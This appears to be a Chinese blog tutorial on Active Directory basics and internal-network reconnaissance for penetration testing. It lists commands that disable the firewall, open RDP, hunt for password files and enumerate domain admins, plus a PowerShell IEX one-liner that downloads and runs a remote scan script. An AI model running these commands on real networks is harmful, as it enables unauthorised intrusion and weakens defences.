@@ -1,0 +1,477 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>教练，我要学内网（一）——内网渗透基础和信息收集 | Kenoeee</title><meta name="keywords" content="-内网渗透"><meta name="author" content="Kenoeee"><meta name="copyright" content="Kenoeee"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="内网渗透基础基础名词解析工作组(Work Group)在一个大的单位里面，有许多电脑互相连接，为了方便，对不同的电脑按照不同的功能列入不同的工作组，比如技术部加入技术部的组里，行政部加入行政部的组里  计算机属性-》计算机名-》更改-》工作组（输入计算机名）默认是WORKGROUP  工作组并没有真正的集中管理作用，可以随时加入和退出，所有计算机都是对等的，没有服务器和客户机之分的 域 域是一个有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="教练，我要学内网（一）——内网渗透基础和信息收集">
+<meta property="og:url" content="http://example.com/2022/06/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/index.html">
+<meta property="og:site_name" content="Kenoeee">
+<meta property="og:description" content="内网渗透基础基础名词解析工作组(Work Group)在一个大的单位里面，有许多电脑互相连接，为了方便，对不同的电脑按照不同的功能列入不同的工作组，比如技术部加入技术部的组里，行政部加入行政部的组里  计算机属性-》计算机名-》更改-》工作组（输入计算机名）默认是WORKGROUP  工作组并没有真正的集中管理作用，可以随时加入和退出，所有计算机都是对等的，没有服务器和客户机之分的 域 域是一个有">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg">
+<meta property="article:published_time" content="2022-06-01T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-06-02T12:45:17.182Z">
+<meta property="article:author" content="Kenoeee">
+<meta property="article:tag" content="-内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/06/02/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '教练，我要学内网（一）——内网渗透基础和信息收集',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-06-02 20:45:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/Kenoeee/blog_img/main/img/20220128021634.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/Kenoeee/blog_img/img/111.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Kenoeee</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">教练，我要学内网（一）——内网渗透基础和信息收集</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-06-01T16:00:00.000Z" title="发表于 2022-06-02 00:00:00">2022-06-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-06-02T12:45:17.182Z" title="更新于 2022-06-02 20:45:17">2022-06-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="教练，我要学内网（一）——内网渗透基础和信息收集"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="内网渗透基础"><a href="#内网渗透基础" class="headerlink" title="内网渗透基础"></a>内网渗透基础</h1><h2 id="基础名词解析"><a href="#基础名词解析" class="headerlink" title="基础名词解析"></a>基础名词解析</h2><h3 id="工作组-Work-Group"><a href="#工作组-Work-Group" class="headerlink" title="工作组(Work Group)"></a>工作组(Work Group)</h3><p>在一个大的单位里面，有许多电脑互相连接，为了方便，对不同的电脑按照不同的功能列入不同的工作组，比如技术部加入技术部的组里，行政部加入行政部的组里</p>
+<blockquote>
+<p>计算机属性-》计算机名-》更改-》工作组（输入计算机名）默认是WORKGROUP</p>
+</blockquote>
+<p>工作组并没有真正的集中管理作用，可以随时加入和退出，所有计算机都是对等的，没有服务器和客户机之分的</p>
+<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><ul>
+<li><p>域是一个有安全边界的计算机集合，在两个域中，一个域的用户不能访问另外一个域的资源</p>
+</li>
+<li><p>域控制器（Domain Controller，DC）是一个域中的类似管理服务器的计算机，负责每一台联入的电脑和用户的验证工作，域内电脑如果要互相访问需要经过它的审核</p>
+</li>
+</ul>
+<h4 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h4><p>一般一个域内至少需要两个域服务器，一个作为DC，一个是备份DC，如果没有第二个备份DC，一旦DC瘫痪了，则域内的其它用户就不能登录该域了，因为活动目录的数据库（包括用户的账号信息）是存储在DC中的，如果DC出了问题，用备份域控制器(BDC)恢复一下DC就好了</p>
+<h4 id="父域"><a href="#父域" class="headerlink" title="父域"></a>父域</h4><ul>
+<li>为了管理以及一些需求，需要在网络中划分多个域，第一个域是父域，其它的是该域的子域</li>
+</ul>
+<h4 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h4><ul>
+<li>域树指的是多个域之间的联系，长的和二叉树差不多，子域只能用父域作为域名的后缀，比如父域名是a.com，子域是a.a.com，再下面的子域是a.a.a.com，从此分出了一级域名，二级域名，</li>
+</ul>
+<h4 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h4><p>若干个域树组成域森林</p>
+<h4 id="DNS域名服务器"><a href="#DNS域名服务器" class="headerlink" title="DNS域名服务器"></a>DNS域名服务器</h4><p>用来就行域名和对应IP地址转换的服务器，我们一般通过寻找dns服务器来寻找域控，因为一般回处于同一个机器上</p>
+<h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><ul>
+<li><p>活动目录(Active Directory)是域环境中提供目录服务的组件</p>
+</li>
+<li><p>目录服务帮助用户快速准确的从目录里面寻找需要的资源</p>
+</li>
+<li><p>域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每个域只存储该域内的数据</p>
+</li>
+</ul>
+<p>功能：</p>
+<blockquote>
+<p>1.账号集中管理，所有账号均存在服务器上，方便对账号的操作</p>
+<p>2.软件集中管理，统一推送安装软件</p>
+<p>3.环境集中管理</p>
+<p>4.更可靠，更少的宕机时间</p>
+</blockquote>
+<p>一般情况下，我们会考虑把域内的各种资源分类存入一个数据库，就是活动目录数据库，简称AD库，然后把存放有活动目录数据库的计算机称为DC</p>
+<h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>把一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些ip访问此域，允许此域访问哪些ip/网段，使其风险最小化</p>
+<h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><p>DMZ称为隔离区，为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，所以设立的一个非安全系统与安全系统之间的缓冲区</p>
+<ul>
+<li><p>这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，比如web服务器</p>
+</li>
+<li><p>同时通过这个DMZ区域，有效保护了内部网络</p>
+</li>
+</ul>
+<p>DMZ的功能</p>
+<blockquote>
+<p>1.内网可以访问外网</p>
+<p>2.内网可以访问DMZ</p>
+<p>3.外网不能访问内网</p>
+<p>4.外网可以访问DMZ</p>
+<p>5.DMZ不能访问内网</p>
+<p>6.DMZ不能访问外网（这一条不一定，有的时候DMZ有邮件服务器，需要能够访问外网）</p>
+</blockquote>
+<h3 id="域中服务器的分类"><a href="#域中服务器的分类" class="headerlink" title="域中服务器的分类"></a>域中服务器的分类</h3><ul>
+<li><p>域控</p>
+</li>
+<li><p>成员服务器</p>
+</li>
+<li><p>客户机</p>
+</li>
+<li><p>独立服务器</p>
+</li>
+</ul>
+<h3 id="内权限解读"><a href="#内权限解读" class="headerlink" title="内权限解读"></a>内权限解读</h3><ul>
+<li>域本地组，多域用户访问同一个域，可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限</li>
+</ul>
+<blockquote>
+<p>常见系统内置的域本地组及其组权限</p>
+<p><strong>Administrators</strong>:管理员组，该组的成员可以不受限制地存取计算机/域的资源，是域森林中强大的服务管理组</p>
+<p><strong>Remote Desktop Users</strong>：远程登录组，处于该组的用户才有权限使用远程登录服务</p>
+<p><strong>Print Operators</strong>：打印机操作员组，位于该组内的成员可以管理网络中的打印机，包括建立、管理和删除网络打印机，并可以在本地登录和关闭域控制器。</p>
+<p><strong>Account Operators</strong>：账号操作员组，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器，但是，不能更改属于 Administrators 或 <strong>Domain Admins</strong> 组的账户，也不能修改这些组。在默认情况下，该组中没有成员。</p>
+<p><strong>Server Operators</strong>：服务器操作员组，该组的成员可以管理域服务器，其权限包括建立/管理/删除任意服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器、变更服务器的系统时间、关闭域控制器等。在默认情况下，该组中没有成员。</p>
+<p><strong>BackupOperators</strong>，备份操作员组，改组的成员可以在域控制器中执行备份和还原操作，并可以在本地登录和关闭域控制器。在默认情况下，该组中没有成员。</p>
+</blockquote>
+<ul>
+<li>通用组，通用组的成员可包括域林中任何域的用户账号、全局组和其他通用组，可以在该域林的任何域中指派权限，可以嵌套在其他组中，非常适合在域森林内的跨域访问中使用</li>
+</ul>
+<blockquote>
+<p><strong>Enterprise Admins</strong>：企业系统管理员组，改组是域森林根域中的一个组。Enterprise Admins 组在域森林中的每个域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问控制权。</p>
+<p><strong>Schema Admins</strong>：架构管理员组，是域森林根域中的一个组，可以修改活动目录和域森林的模式。Schema Admins 组是为活动目录和域控制器提供完整权限的域用户组，因此，该组成员的资格是非常重要的。</p>
+</blockquote>
+<ul>
+<li>全局组 只能在创建该全局组的域中添加用户和全局组，也就是说全局组只能包含本域内的用户账户，因此来自一个域的账户不能嵌套在另一个域中的全局组中。这就是为什么来自同一个域的用户不符合在外部域中的域管的成员资格。但是可以将本域内某个全局组添加或嵌套到同一个域的另一个全局组中，或者添加到其他域的通用组和域本地组中。<blockquote>
+<p>Domain Admins，管理员组，该组的成员在所有加入域的服务器、域控制器和活动目录中均默认拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组中，因此可以继承 Administrators 组的所有权限。同时，该组默认会被添加到每台域成员计算机的本地 Administrators 组中，这样，Domain Admins 组就获得了域中所有计算机的所有权。如果希望某用户成为域系统管理员，建议将该用户添加到 Domain Admins 组中，而不要直接将该用户添加到 Administrators 组中。</p>
+<p>Domain Users，域用户组，该组的成员中是所有的域用户。在默认情况下，任何由我们建立的更户账号都属于 Domain Users 组。因此，如果想让所有的账号都获得某种资源在取权限、可以将该权限指定给域用户组，或者让域用户组属于具有该权限的组。</p>
+<p>Domain Computers，域成员主机组，该组的成员是域内所有的域成员主机，任何由我们建立的计算机账号都属于 Domain Computers 组。</p>
+<p>Domain Controllers，域控制器组，该组成员包含了域内所有的域控制器。</p>
+<p>Domain Guests，域访客用户组，该组内的成员默认为域访客用户，域成员计算机会自动将此组加到本地的 Guests 组中。</p>
+<p>Group Policy Creator Owners：此组成员可以修改域的组策略。</p>
+<p>DnsUpdateProxy：此组成员允许替其他客户端（如DHCP服务器）执行动态更新的 DNS 客户端。</p>
+<p>Read-only Domain Controllers：此组中的成员是域中的只读域控制器</p>
+</blockquote>
+<h3 id="三种组作用域的比较"><a href="#三种组作用域的比较" class="headerlink" title="三种组作用域的比较"></a>三种组作用域的比较</h3><table>
+<thead>
+<tr>
+<th>组类型</th>
+<th>作用范围</th>
+<th>可包含的成员</th>
+<th>成员是否在全局编录复制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>域本地组</td>
+<td>在同一个域内，本域内。</td>
+<td>来自任何域或任何受信任域的帐户。 来自任何域或任何受信任域的全局组。 来自同一林中任何域的通用组。 来自同一域的其他域本地组。</td>
+<td>否</td>
+</tr>
+<tr>
+<td>通用组</td>
+<td>所有域。</td>
+<td>来自同一林中任何域的帐户。 来自同一林中任何域的全局组。 来自同一林中任何域的其他通用组。</td>
+<td>是</td>
+</tr>
+<tr>
+<td>全局组</td>
+<td>所有域。</td>
+<td>来自同一域的帐户。 来自同一域的其他全局组。</td>
+<td>否</td>
+</tr>
+</tbody></table>
+简单来说：域本地组：来自全林用于本域全局组：来自本域作用于全林通用组：来自全林作用于全林<h3 id="AGDLP权限划分"><a href="#AGDLP权限划分" class="headerlink" title="AGDLP权限划分"></a>AGDLP权限划分</h3><blockquote>
+<p>A（Account）表示用户账号</p>
+<p>G（Global Group）表示全局组</p>
+<p>U（Universal Group）表示通用组</p>
+<p>L（Local Group）表示本地组</p>
+<p>DL（Domain Local Group）表示域本地组</p>
+<p>P（Resource Permissions）表示资源权限</p>
+</blockquote>
+按照 AGDLP 权限划分策略对域用户进行组织和管理十分方便，在 AGDLP 策略形成之后，如果需要给一个用户添加某个特定权限时，只需要把这个用户添加到其所在域的域本地组中就行了。</li>
+</ul>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><ul>
+<li>查询网络配置</li>
+</ul>
+<blockquote>
+<p>ipconfig /all</p>
+</blockquote>
+<p>可以查看ip 还能根据dns后缀判断域</p>
+<ul>
+<li>查询用户列表</li>
+</ul>
+<blockquote>
+<p>net user  查询用户列表</p>
+<p>net localgroup Administrators 查看本机管理员用户和域管理员</p>
+<p>query user ||qwinsta 查看登录用户和时间</p>
+</blockquote>
+<ul>
+<li>查询进程</li>
+</ul>
+<blockquote>
+<p>tasklist /v 可查看进程对应用户名</p>
+<p>wmic process list brief</p>
+</blockquote>
+<ul>
+<li>查询操作系统的信息</li>
+</ul>
+<blockquote>
+<p>systeminfo 可以看补丁</p>
+<p>wmic qfe get caption,description,installedon,hotfixid 查看打补丁和时间</p>
+<p>wmic product get name,version 可以查看一些系统语言环境、杀毒软件</p>
+</blockquote>
+<ul>
+<li>查询端口列表</li>
+</ul>
+<blockquote>
+<p>netstat -ano</p>
+</blockquote>
+<ul>
+<li>查询本地共享</li>
+</ul>
+<blockquote>
+<p>net share </p>
+<p>wmic share get name,path,status</p>
+</blockquote>
+<ul>
+<li>查询防火墙配置</li>
+</ul>
+<blockquote>
+<p>netsh firewall show config </p>
+<p>netsh advfirewall firewall add rule name =” pass nc” dir=in action =allow program=”c:\xxx.exe”</p>
+<p>允许指定程序连入</p>
+<p>netsh advfirewall firewall add rule name =” allow nc” dir=out action =allow program=”c:\xxx.exe”</p>
+<p>允许指定程序连出</p>
+<p>netsh advfirewall firewall add rule name =”Remote Desktop” protocol=TCP dir =in localport=3389 action =allow</p>
+<p>允许3389</p>
+<p>netsh advfirewall set allprofiles state off #关闭防火墙</p>
+</blockquote>
+<ul>
+<li>打开3389</li>
+</ul>
+<blockquote>
+<p>查看端口<br><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code><br>得到连接端口为 0xd3d，转换后为 3389</p>
+<h6 id="windows-server-2003"><a href="#windows-server-2003" class="headerlink" title="windows server 2003"></a>windows server 2003</h6><blockquote>
+<p>开启1：<br><code>REG ADD \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>关闭：<br><code>REG ADD \&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\&quot; /v fDenyTSConnections /t REG_DWORD /d 11111111 /f</code><br>开启2：<br><code>wmic RDTOGGLE WHERE ServerName=&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code><br><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br><code>REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f</code></p>
+</blockquote>
+<h6 id="windows-server-2008"><a href="#windows-server-2008" class="headerlink" title="windows server 2008"></a>windows server 2008</h6><blockquote>
+<p>开启：<br><code>REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</code></p>
+</blockquote>
+</blockquote>
+<h4 id="工作组信息收集"><a href="#工作组信息收集" class="headerlink" title="工作组信息收集"></a>工作组信息收集</h4><ul>
+<li>查看SID</li>
+</ul>
+<blockquote>
+<p>whoami /all</p>
+</blockquote>
+<ul>
+<li>查看几个域</li>
+</ul>
+<blockquote>
+<p>net view /domain</p>
+</blockquote>
+<ul>
+<li>查看指定域用户信息</li>
+</ul>
+<blockquote>
+<p>net user xxx/domain</p>
+</blockquote>
+<ul>
+<li>查看用户名</li>
+</ul>
+<blockquote>
+<p>hostname</p>
+</blockquote>
+<h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><ul>
+<li>查看是否有域</li>
+</ul>
+<blockquote>
+<p>ipconfig /all</p>
+<p>nslookup 域名 </p>
+<p>systeminfo</p>
+<p>net config workstation 查看当前登录域</p>
+<p>net time/domain 可以判断是否在域内</p>
+</blockquote>
+<ul>
+<li>域内存活主机推测</li>
+</ul>
+<blockquote>
+<p>for /L %l in (1,1,254) do @ping -w 1 -n 1 192.168.1.%l findstr “TTL=”</p>
+<p>for k in $( seq 1 255);do ping -c 1 192.168.99.$k|grep “ttl”|awk -F “[ :]+” ‘{print $4}’; done</p>
+<p>利用ICMP协议推测</p>
+<p> nbtscan.exe ip</p>
+<p><a target="_blank" rel="noopener" href="http://unixwiz.net/tools/nbtscan.html">下载地址</a></p>
+<p>Invoke-ARPScan.ps1脚本</p>
+<p>powershell.exe -exec bypass -Command “&amp; {Import-Module Invoke-ARPScan.ps; Invoke-ARPScan -CIDR 192.168.1.0/24}” &gt;&gt;  C:\Users\Administrator\Desktop\log.txt</p>
+<blockquote>
+<p>ScanLine探测内网端口<br>.\sl.exe -h -t 22,80,445,3389,1099,1433,2049 -u 53,161,137,139 -O c:\C:\Users\Administrator\Desktop\log.txt -p 192.168.1.1-254<br>1<br>-t 是指定TCP断就扫描<br>-u是指定UDP端口扫描</p>
+</blockquote>
+</blockquote>
+<ul>
+<li>域内端口扫描</li>
+</ul>
+<blockquote>
+<p>telnet 192.168.0.2 22 #利用telnet进行扫描</p>
+<p>powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan</a> -Hosts 192.168.1.0/24 -T 4 -ports ‘445,1433,80,8080,3389’ -oA c:\ProgramData\ip_info”</p>
+<p>PowerSploit的Invoke-portscan.ps1</p>
+</blockquote>
+<ul>
+<li>域内信息收集</li>
+</ul>
+<blockquote>
+<p>net view /domain 查看域</p>
+<p>net group /domain 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain 查看域中某工作组<br>net group “domain admins” /domain 查看域管理员的名字<br>net group “domain computers” /domain 查看域中的其他主机名</p>
+<p>net accounts /domain 查看密码策略<br>net group “doamin controllers” /domain 查看域控制器（可能有多台）</p>
+<p>nltest /domain_trusts 查看域的结构</p>
+</blockquote>
+<ul>
+<li>查找域控</li>
+</ul>
+<blockquote>
+<p>nltest /DCLIST:域名   </p>
+<p>nslookup -type=SRU _ldap._tcp</p>
+<p>net group “Domain Controllers” /domain</p>
+<p>netdom query pdc</p>
+</blockquote>
+<ul>
+<li>域内用户和管理员列表</li>
+</ul>
+<blockquote>
+<p>net user /domain</p>
+<p>wmic useraccount get /all</p>
+<p>dsquery user</p>
+<p>net localgroup administrators /domain</p>
+</blockquote>
+<h5 id="powershell收集域信息"><a href="#powershell收集域信息" class="headerlink" title="powershell收集域信息"></a>powershell收集域信息</h5><ul>
+<li>powershell是微软官网的脚本语言，功能十分强大</li>
+</ul>
+<blockquote>
+<p>2.0 win2008 win7</p>
+<p>3.0 win2012 win8</p>
+<p>4.0 win2012R2 win8.1</p>
+<p>5.0 win2016 win10</p>
+</blockquote>
+<p>powershell命令</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">powershell常见四个执行策略，Restricted 不允许运行脚本</span><br><span class="line">Allsigned 执行有证书的脚本</span><br><span class="line">Unrestricted 可执行任意脚本</span><br><span class="line">Remotesigned 本地脚本无限制，外部脚本需要签名</span><br><span class="line"><span class="built_in">get-executionpolicy</span> 判断权限</span><br><span class="line"><span class="built_in">set-executionpolicy</span> xxx 设置执行策略</span><br><span class="line"><span class="built_in">import-module</span> .\powerview.ps1 执行powerview脚本</span><br><span class="line"><span class="comment">#powerview常见命令</span></span><br><span class="line"><span class="built_in">get-netdomain</span> 查询当前用户域名称</span><br><span class="line"><span class="built_in">get-netuser</span> 查询用户信息</span><br><span class="line"><span class="built_in">get-netdomaincontroller</span> 查询域控</span><br><span class="line"><span class="built_in">get-netcomputer</span> 获取域内主机</span><br><span class="line"><span class="built_in">get-netgroup</span> 获取域内组信息</span><br><span class="line"><span class="built_in">get-netshare</span> 获取网络共享</span><br><span class="line"><span class="built_in">get-netsession</span> 获取指定服务器session信息</span><br><span class="line"><span class="built_in">get-netrdpsession</span> 获取远程连接信息</span><br><span class="line"><span class="built_in">get-userevent</span> 查看用户日志</span><br><span class="line"><span class="built_in">get-ADobject</span> 获取活动目录内容</span><br><span class="line"><span class="built_in">get-netGPO</span> 查看组策略对象</span><br><span class="line"><span class="built_in">get-domainpolicy</span> 查看域默认或域控策略</span><br><span class="line"><span class="built_in">invoke-processHunter</span> 获取域用户登录计算机信息以及权限</span><br><span class="line"><span class="built_in">invoke-usereventHunter</span> 根据用户日志获取某域用户登录过哪些域机器</span><br><span class="line"><span class="built_in">invoke-processHunter</span>查看域内所有机器进程用于查找用户</span><br></pre></td></tr></table></figure>
+
+<p>假如不是powershell下，可以在cmd里用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass &quot;import-module c:\powerview.ps1;get-netuser&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir c:\*.doc /s</span><br><span class="line">findstr /si &quot;password.txt&quot;</span><br><span class="line">netstat -ano</span><br><span class="line">tasklist /v</span><br><span class="line">rount print 路由信息</span><br></pre></td></tr></table></figure>
+
+<h5 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h5><p>由于当主机连入域后，域管理员会自动添加到主机的账号里面，所以有了域管理员的账号后，可以登录任意主机，而且权限很高</p>
+<p>定位域管理员通常有两个思路，一个是日志，另外一个是进程</p>
+<p>常见工具：(cs的一些插件自带)</p>
+<ul>
+<li><p>psloggedon.exe</p>
+</li>
+<li><p>PVEFindADUser.exe</p>
+</li>
+<li><p>netview.exe</p>
+</li>
+<li><p>netsess.exe</p>
+</li>
+<li><p>Powerview脚本的invoke-UserHunter</p>
+</li>
+</ul>
+<p><strong>查找域管理进程</strong></p>
+<blockquote>
+<p>net view /domain 查看当前域名</p>
+<p>net view /domain:域名 查看域内部所有计算机名</p>
+<p>net group /domain 查看域内部所有用户组列表</p>
+<p>net group “domain computers” /domain 查看所有域成员计算机列表</p>
+<p>net accounts /domain 查看域密码信息</p>
+<p>nltest /domian_trusts 获取域信任信息</p>
+<p>nltest /DCLIST:域名 查看域控制器机器名</p>
+<p>net time /domain 查看当前时间，因为时间服务器也是主域服务器，可以看到域服务器的机器名</p>
+<p>net group “Domain Controllers” /domain 查看域控制器组，因为可能有不止一台域控，有主备之分</p>
